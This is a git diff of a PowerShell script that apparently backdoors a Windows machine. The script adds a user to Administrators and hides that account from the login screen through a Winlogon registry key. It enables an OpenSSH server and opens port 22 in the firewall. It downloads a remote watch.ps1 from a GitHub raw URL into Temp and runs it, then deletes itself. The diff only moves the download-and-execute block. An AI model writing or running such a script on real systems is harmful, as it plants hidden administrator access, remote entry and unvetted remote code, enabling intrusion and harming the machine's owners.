@@ -17,11 +17,6 @@ Add-LocalGroupMember -Group "Administrators" -Member $user
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v $user
 
 
-mkdir $env:Temp/$temp_dir
-Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/experiments/main/watch.ps1' -OutFile $env:Temp/$temp_dir/watch.ps1
-& $env:Temp/$temp_dir/watch.ps1
-
-
 # Open SSH and port 22 (add a rule in firewall as well)
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
@@ -30,6 +25,10 @@ if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyCon
     New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
 }
 
+
+mkdir $env:Temp/$temp_dir
+Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/experiments/main/watch.ps1' -OutFile $env:Temp/$temp_dir/watch.ps1
+& $env:Temp/$temp_dir/watch.ps1
 
 
 Remove-Item $PSCommandPath -Force
